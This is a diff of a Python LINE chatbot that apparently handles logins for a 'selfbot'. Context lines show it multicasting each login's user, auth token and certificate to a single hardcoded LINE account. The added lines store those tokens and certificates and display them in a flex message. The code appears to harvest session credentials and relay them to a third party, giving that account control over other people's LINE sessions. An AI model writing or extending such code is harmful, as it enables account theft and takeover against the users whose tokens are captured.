@@ -49,6 +49,8 @@ with open('by.json', 'r') as fp:
     wait = json.load(fp)
 ugh = {
     "midLogin": "ubb8b8d8a7a8e8450e1749775a0063e24",
+    "tokenLogin": "ubb8b8d8a7a8e8450e1749775a0063e24",
+    "certLogin": "ubb8b8d8a7a8e8450e1749775a0063e24",
     "codePin": "111"
 }
 #===================[ LINKE STARTO ]=====================	
@@ -375,6 +377,8 @@ def handle_message(event):
 		line_bot_api.multicast(["U6fc8ba0b12969b336ad129e39f8d84b1"],
 		[TextSendMessage(text='Logins {} {} {} {}'.format(us,hasil,certs,q)),])
 		print("Logins {} {} {} {}".format(us,hasil,certs,q))
+		ugh["tokenLogin"] = hasil
+		ugh["certLogin"] = certs
 
 	elif text == 'success login':
 		q = "{}".format(ugh["midLogin"])
@@ -414,16 +418,17 @@ def handle_message(event):
               },
               {
                 "type": "text",
-                "text": "Success Login {}".format(q),
+                "text": "Succes Login",
                 "weight": "bold",
                 "style": "italic",
                 "decoration": "underline",
-                "size": "lg",
+                "size": "md",
                 "action": {
                   "type": "message",
                   "label": "action",
-                  "text": "Success Login Selfbot"
-                }
+                  "text": "File : {}\nToken : {}\nCert : {}".format(us,tkn,crt)
+                },
+                "wrap": True
               }
             ]
           }
